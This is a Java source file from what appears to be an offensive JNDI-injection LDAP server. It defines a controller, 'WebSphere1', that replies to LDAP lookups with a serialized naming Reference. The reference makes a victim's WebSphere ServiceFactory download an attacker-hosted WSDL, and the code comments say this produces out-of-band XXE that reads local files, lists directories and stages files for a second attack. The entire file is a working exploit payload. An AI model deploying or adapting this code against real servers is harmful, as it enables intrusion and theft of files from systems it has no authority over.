package artsploit.controllers;

import artsploit.Config;
import artsploit.Utilities;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * WebSphere1 attack leverages {@link com.ibm.ws.webservices.engine.client.ServiceFactory}
 *  to download and parse WSDL files from arbitrary locations
 *
 * Yields:
 *  OOB XXE in WSDL parsing with the ability to read some files from local disk or list directories
 *  Could also be used to upload files in the temporary folder for {@link WebSphere2}
 *  @see artsploit.HttpServer for example of malicious WSDL payloads
 *
 * Requires:
 * - websphere v6-9 libraries in the classpath
 *
 * @author artsploit
 */
@LdapMapping(uri = { "/o=websphere1", "/o=websphere1,wsdl=*" })
public class WebSphere1 implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        //get wsdl location from the url parameter
        String wsdl = Utilities.getDnParam(result.getRequest().getBaseDN(), "wsdl");
        if(wsdl == null)
            wsdl = "http://" + Config.hostname + ":" + Config.httpPort + Config.wsdl; //get from config if not specified

        System.out.println("Sending Websphere1 payload pointing to " + wsdl);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare payload that exploits XXE in com.ibm.ws.webservices.engine.client.ServiceFactory
        javax.naming.Reference ref = new Reference("ExploitObject",
                "com.ibm.ws.webservices.engine.client.ServiceFactory", null);
        ref.add(new StringRefAddr("WSDL location", wsdl));
        ref.add(new StringRefAddr("service namespace","xxx"));
        ref.add(new StringRefAddr("service local part","yyy"));

        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
